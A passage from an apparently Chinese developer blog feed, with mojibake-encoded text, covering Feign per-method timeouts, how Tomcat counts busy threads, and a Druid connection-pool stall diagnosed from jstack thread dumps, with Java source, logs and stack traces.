<h3 id="éƒ¨åˆ†æºç "><a href="#éƒ¨åˆ†æºç " class="headerlink" title="éƒ¨åˆ†æºç "></a>éƒ¨åˆ†æºç </h3><p>ç‰ˆæœ¬ï¼š<code>10.10.1</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// feign.SynchronousMethodHandler#invoke</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object[] argv)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    RequestTemplate template = buildTemplateFromArgs.create(argv);</span><br><span class="line">    <span class="comment">// ä»å‚æ•°ä¸­æ‰¾å¯¹åº”çš„option</span></span><br><span class="line">    Options options = findOptions(argv);</span><br><span class="line">    Retryer retryer = <span class="keyword">this</span>.retryer.clone();</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> executeAndDecode(template, options);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (RetryableException e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          retryer.continueOrPropagate(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RetryableException th) &#123;</span><br><span class="line">          Throwable cause = th.getCause();</span><br><span class="line">          <span class="keyword">if</span> (propagationPolicy == UNWRAP &amp;&amp; cause != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> cause;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logLevel != Logger.Level.NONE) &#123;</span><br><span class="line">          logger.logRetry(metadata.configKey(), logLevel);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><code>findOptions</code>çš„ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Options <span class="title">findOptions</span><span class="params">(Object[] argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (argv == <span class="keyword">null</span> || argv.length == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.options;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Stream.of(argv)</span><br><span class="line">      .filter(Options.class::isInstance)</span><br><span class="line">      .map(Options.class::cast)</span><br><span class="line">      .findFirst()</span><br><span class="line">    	<span class="comment">// fall back toæ€»çš„è¶…æ—¶</span></span><br><span class="line">      .orElse(<span class="keyword">this</span>.options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p>å¦‚æœä½¿ç”¨<code>feign-ribbon</code>ï¼Œç‰ˆæœ¬è¦å’Œ<code>feign-core</code>ä¿æŒä¸€è‡´ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: url values must be not be absolute.</span><br><span class="line"></span><br><span class="line">	at feign.RequestTemplate.uri(RequestTemplate.java:438)</span><br><span class="line">	at feign.RequestTemplate.uri(RequestTemplate.java:425)</span><br><span class="line">	at feign.RequestTemplate.append(RequestTemplate.java:392)</span><br><span class="line">	at feign.ribbon.LBClient<span class="variable">$RibbonRequest</span>.toRequest(LBClient.java:100)</span><br><span class="line">	at feign.ribbon.LBClient.getRequestSpecificRetryHandler(LBClient.java:79)</span><br><span class="line">	at feign.ribbon.LBClient.getRequestSpecificRetryHandler(LBClient.java:38)</span><br><span class="line">	at com.netflix.client.AbstractLoadBalancerAwareClient.buildLoadBalancerCommand(AbstractLoadBalancerAwareClient.java:127)</span><br><span class="line">	at com.netflix.client.AbstractLoadBalancerAwareClient.executeWithLoadBalancer(AbstractLoadBalancerAwareClient.java:94)</span><br><span class="line">	at feign.ribbon.RibbonClient.execute(RibbonClient.java:69)</span><br><span class="line">	at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:119)</span><br><span class="line">	at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89)</span><br><span class="line">	at feign.ReflectiveFeign<span class="variable">$FeignInvocationHandler</span>.invoke(ReflectiveFeign.java:100)</span><br><span class="line">	at com.sun.proxy.<span class="variable">$Proxy36</span>.getEffectiveMebIds(Unknown Source)</span><br></pre></td></tr></table></figure>
<img src="/2020/04/28/feign-method-timeout/image-20200428135018581.png">
<p><code>vip</code>æ²¡æœ‰è§£æå‡ºæ¥ï¼Œç‰ˆæœ¬æ”¹äº†ä¹‹åå°±æ²¡æœ‰é—®é¢˜äº†:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">feign-core.version</span>&gt;</span>10.10.1<span class="tag">&lt;/<span class="name">feign-core.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;feign-core.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.github.openfeign<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>feign-ribbon<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;feign-core.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä»£ç é‡Œè¿æ¥è¶…æ—¶è®¾ç½®ä¸º100millsï¼Œ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> List&lt;Integer&gt; effectiveMebIds =</span><br><span class="line">           personalMemberRemote.getEffectiveMebIds(<span class="keyword">new</span> Request.Options(<span class="number">100</span>, <span class="number">500</span>), Lists.newArrayList(<span class="number">1</span>, <span class="number">17</span>, <span class="number">15</span>, <span class="number">1386232841</span>));</span><br></pre></td></tr></table></figure>
<p>ç»“æœï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG c.n.l.DynamicServerListLoadBalancer-179  - Setting server list <span class="keyword">for</span> zones: &#123;defaultzone=[192.168.16.211:10020]&#125;</span><br><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG c.n.loadbalancer.BaseLoadBalancer-472  - LoadBalancer [user-center_defaultzone]: clearing server list (SET op)</span><br><span class="line">13:55:21.376 [PollingServerListUpdater-0] DEBUG c.n.loadbalancer.BaseLoadBalancer-488  - LoadBalancer [user-center_defaultzone]:  addServer [192.168.16.211:10020]</span><br><span class="line">13:55:21.600 [main] DEBUG c.n.l.ZoneAwareLoadBalancer-112  - Zone aware logic disabled or there is only one zone</span><br><span class="line">13:55:21.633 [main] DEBUG c.n.loadbalancer.LoadBalancerContext-492  - user-center using LB returned Server: 192.168.16.211:10020 <span class="keyword">for</span> request http:///personalMember/getEffectiveMebIds</span><br><span class="line">13:55:21.741 [main] DEBUG c.n.l.reactive.LoadBalancerCommand-314  - Got error java.net.SocketTimeoutException: connect timed out when executed on server 192.168.16.211:10020</span><br><span class="line">13:55:22.253 [main] DEBUG c.n.l.ZoneAwareLoadBalancer-112  - Zone aware logic disabled or there is only one zone</span><br><span class="line">13:55:22.254 [main] DEBUG c.n.loadbalancer.LoadBalancerContext-492  - user-center using LB returned Server: 192.168.16.211:10020 <span class="keyword">for</span> request http:///personalMember/getEffectiveMebIds</span><br><span class="line">13:55:22.358 [main] DEBUG c.n.l.reactive.LoadBalancerCommand-314  - Got error java.net.SocketTimeoutException: connect timed out when executed on server 192.168.16.211:10020</span><br><span class="line"></span><br><span class="line">feign.RetryableException: connect timed out executing POST http://user-center/personalMember/getEffectiveMebIds</span><br><span class="line"></span><br><span class="line">	at feign.FeignException.errorExecuting(FeignException.java:249)</span><br><span class="line">	at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:129)</span><br><span class="line">	at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89)</span><br><span class="line">	at feign.ReflectiveFeign<span class="variable">$FeignInvocationHandler</span>.invoke(ReflectiveFeign.java:100)</span><br><span class="line">	at com.sun.proxy.<span class="variable">$Proxy36</span>.getEffectiveMebIds(Unknown Source)</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥è¶…æ—¶äº†ï¼Œè¯´æ˜è¿™ä¸ªé™åˆ¶ç”Ÿæ•ˆäº†ã€‚</p>
]]></content>
      
        <categories>
            
            <category> feign </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spring-cloud </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcat busy threadå¦‚ä½•ç»Ÿè®¡çš„]]></title>
      <url>http://qsli.github.io/2020/04/27/tomcat-busy-thread/</url>
      <content type="html"><![CDATA[<h2 id="tomcat-busy-thread"><a href="#tomcat-busy-thread" class="headerlink" title="tomcat busy thread"></a>tomcat busy thread</h2><p>çªç„¶å¥½å¥‡tomcatçš„busy threadæ€ä¹ˆç»Ÿè®¡çš„ï¼Œç¿»äº†ä¸‹ä»£ç ã€‚</p>
<h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.tomcat.util.net.AbstractEndpoint#getCurrentThreadsBusy   </span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Return the amount of threads that are in use</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the amount of threads that are in use</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCurrentThreadsBusy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (executor!=<span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (executor <span class="keyword">instanceof</span> ThreadPoolExecutor) &#123;</span><br><span class="line">      <span class="keyword">return</span> ((ThreadPoolExecutor)executor).getActiveCount();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (executor <span class="keyword">instanceof</span> ResizableExecutor) &#123;</span><br><span class="line">      <span class="keyword">return</span> ((ResizableExecutor)executor).getActiveCount();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶å®å°±æ˜¯åœ¨æ‰§è¡Œä»»åŠ¡çš„çº¿ç¨‹è·Ÿçº¿ç¨‹çš„çŠ¶æ€æ²¡æœ‰å…³ç³»ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// java.util.concurrent.ThreadPoolExecutor#getActiveCount</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the approximate number of threads that are actively</span></span><br><span class="line"><span class="comment">     * executing tasks.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the number of threads</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getActiveCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">  mainLock.lock();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Worker w : workers)</span><br><span class="line">      <span class="keyword">if</span> (w.isLocked())</span><br><span class="line">        ++n;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    mainLock.unlock();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="è·å–"><a href="#è·å–" class="headerlink" title="è·å–"></a>è·å–</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> MBeanServer server = ManagementFactory.getPlatformMBeanServer();</span><br><span class="line">Set&lt;ObjectName&gt; names = server.queryNames(<span class="keyword">new</span> ObjectName(<span class="string">"Catalina:type=ThreadPool,*"</span>), <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">final</span> ObjectName name : names) &#123;</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    <span class="keyword">final</span> Object maxThreads = server.getAttribute(name, <span class="string">"maxThreads"</span>);</span><br><span class="line">    <span class="keyword">final</span> Object currentThreadCount = server.getAttribute(name, <span class="string">"currentThreadCount"</span>);</span><br><span class="line">    <span class="keyword">final</span> Object currentThreadsBusy = server.getAttribute(name, <span class="string">"currentThreadsBusy"</span>);</span><br><span class="line">    System.out.println(<span class="string">"maxThreads = "</span> + maxThreads);</span><br><span class="line">    System.out.println(<span class="string">"currentThreadCount = "</span> + currentThreadCount);</span><br><span class="line">    System.out.println(<span class="string">"currentThreadsBusy = "</span> + currentThreadsBusy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Catalina:<span class="built_in">type</span>=ThreadPool,name=<span class="string">"ajp-nio-8009"</span></span><br><span class="line">maxThreads = 200</span><br><span class="line">currentThreadCount = 10</span><br><span class="line">currentThreadsBusy = 0</span><br><span class="line">Catalina:<span class="built_in">type</span>=ThreadPool,name=<span class="string">"http-nio-8080"</span></span><br><span class="line">maxThreads = 200</span><br><span class="line">currentThreadCount = 10</span><br><span class="line">currentThreadsBusy = 0</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> busy-thread </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Druidè¿æ¥æ³„éœ²è®°å½•]]></title>
      <url>http://qsli.github.io/2020/04/25/druid-conn-leak/</url>
      <content type="html"><![CDATA[<h2 id="ç°è±¡"><a href="#ç°è±¡" class="headerlink" title="ç°è±¡"></a>ç°è±¡</h2><p>å½“æ—¶æ•°æ®åº“éœ€è¦å‡çº§é…ç½®ï¼Œå·²çŸ¥ä¸­é—´ä¼šæœ‰é—ªæ–­ï¼ŒæŒ‰ç…§ä¹‹å‰çš„ç»éªŒéƒ½æ˜¯è‡ªåŠ¨é‡è¿ç„¶åæ¢å¤ã€‚ä½†æ˜¯ï¼Œè¿™æ¬¡tomcatçš„è¿æ¥çº¿ç¨‹å…¨éƒ¨å˜æˆbusyï¼Œå¯¼è‡´åº”ç”¨ä¸èƒ½æä¾›æœåŠ¡ã€‚çº¿ç¨‹æ ˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"http-nio-11022-exec-196"</span> <span class="comment">#216701 daemon prio=5 os_prio=0 tid=0x00007fbac4082000 nid=0x3c4a waiting on condition [0x00007fba0fb52000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">	at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">	- parking to <span class="built_in">wait</span> <span class="keyword">for</span>  &lt;0x00007fbb318710f0&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>)</span><br><span class="line">	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">	at java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.takeLast(DruidDataSource.java:1899)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.getConnectionInternal(DruidDataSource.java:1460)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.getConnectionDirect(DruidDataSource.java:1255)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5007)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.filter.logging.LogFilter.dataSource_getConnection(LogFilter.java:876)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.filter.stat.StatFilter.dataSource_getConnection(StatFilter.java:680)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.filter.stat.StatFilter.dataSource_getConnection(StatFilter.java:680)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.dataSource_getConnection(FilterAdapter.java:2745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.dataSource_connect(FilterChainImpl.java:5003)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1233)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:1225)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource.getConnection(DruidDataSource.java:90)</span><br><span class="line">	at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:140)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">	at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">	at org.mybatis.spring.transaction.SpringManagedTransaction.getConnection(SpringManagedTransaction.java:68)</span><br><span class="line">	at com.atour.migrate.helper.mybatis.interceptor.MyBatisMigrateChainIdKiller.checkDsIgnoreTableStatus(MyBatisMigrateChainIdKiller.java:181)</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹jstackçš„è¾“å‡ºå‘ç°è¿æ¥çº¿ç¨‹éƒ½å¡åœ¨äº†<code>DruidDataSource.java:1899</code>ï¼Œ ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DruidConnectionHolder <span class="title">takeLast</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException, SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">while</span> (poolingCount == <span class="number">0</span>) &#123;</span><br><span class="line">               emptySignal(); <span class="comment">// send signal to CreateThread create connection</span></span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (failFast &amp;&amp; failContinuous.get()) &#123;</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> DataSourceNotAvailableException(createError);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               notEmptyWaitThreadCount++;</span><br><span class="line">               <span class="keyword">if</span> (notEmptyWaitThreadCount &gt; notEmptyWaitThreadPeak) &#123;</span><br><span class="line">                   notEmptyWaitThreadPeak = notEmptyWaitThreadCount;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                 	<span class="comment">// DruidDataSource.java:1899 å¡åœ¨è¿™é‡Œ</span></span><br><span class="line">                   notEmpty.await(); <span class="comment">// signal by recycle or creator</span></span><br><span class="line">               &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                   notEmptyWaitThreadCount--;</span><br><span class="line">               &#125;</span><br><span class="line">               notEmptyWaitCount++;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span> (!enable) &#123;</span><br><span class="line">                   connectErrorCountUpdater.incrementAndGet(<span class="keyword">this</span>);</span><br><span class="line">                   <span class="keyword">throw</span> <span class="keyword">new</span> DataSourceDisableException();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InterruptedException ie) &#123;</span><br><span class="line">           notEmpty.signal(); <span class="comment">// propagate to non-interrupted thread</span></span><br><span class="line">           notEmptySignalCount++;</span><br><span class="line">           <span class="keyword">throw</span> ie;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       decrementPoolingCount();</span><br><span class="line">       DruidConnectionHolder last = connections[poolingCount];</span><br><span class="line">       connections[poolingCount] = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> last;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>ç­‰å¾…åœ¨druidçš„notEmptyé˜Ÿé‡Œä¸Šï¼Œç­‰å¾…æœ‰å¯ç”¨çš„è¿æ¥ã€‚æ‰¾åˆ°å¯¹åº”çš„åˆ›å»ºè¿æ¥çº¿ç¨‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Druid-ConnectionPool-Create-219971169"</span> <span class="comment">#80 daemon prio=5 os_prio=0 tid=0x00007fbab2fce000 nid=0x67e0 waiting on condition [0x00007fba2b974000]</span></span><br><span class="line">   java.lang.Thread.State: WAITING (parking)</span><br><span class="line">	at sun.misc.Unsafe.park(Native Method)</span><br><span class="line">	- parking to <span class="built_in">wait</span> <span class="keyword">for</span>  &lt;0x00007fbb31048098&gt; (a java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>)</span><br><span class="line">	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)</span><br><span class="line">	at java.util.concurrent.locks.AbstractQueuedSynchronizer<span class="variable">$ConditionObject</span>.await(AbstractQueuedSynchronizer.java:2039)</span><br><span class="line">	at com.alibaba.druid.pool.DruidDataSource<span class="variable">$CreateConnectionThread</span>.run(DruidDataSource.java:2448)</span><br><span class="line"></span><br><span class="line">   Locked ownable synchronizers:</span><br><span class="line">	- None</span><br></pre></td></tr></table></figure>
<p>å¯¹åº”çš„ä»£ç ï¼š</p>
